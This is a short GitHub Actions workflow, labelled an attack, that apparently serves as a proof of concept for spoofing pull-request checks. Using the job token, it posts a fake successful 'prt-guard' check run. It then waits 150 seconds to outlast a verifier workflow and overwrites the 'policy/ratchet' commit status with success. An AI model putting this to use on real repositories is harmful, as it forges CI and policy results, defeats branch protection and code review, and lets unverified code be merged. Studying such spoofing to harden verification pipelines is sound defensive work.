name: spoof
on: { pull_request: }
permissions: { statuses: write, checks: write }
jobs:
  spoof:
    runs-on: ubuntu-latest
    steps:
      - env: { GH_TOKEN: "${{ github.token }}", SHA: "${{ github.event.pull_request.head.sha }}" }
        run: |
          echo "DEF=ATTACK spoof2"
          gh api repos/$GITHUB_REPOSITORY/check-runs -f name=prt-guard -f head_sha=$SHA -f status=completed -f conclusion=success --jq '{spoofcheck:.id,app:.app.slug,suite:.check_suite.id}'
          sleep 150   # outwait the workflow_run verifier, then overwrite its status (latest-wins)
          gh api repos/$GITHUB_REPOSITORY/statuses/$SHA -f state=success -f context=policy/ratchet -f description=spoofed-late --jq '{id,creator:.creator.login}'
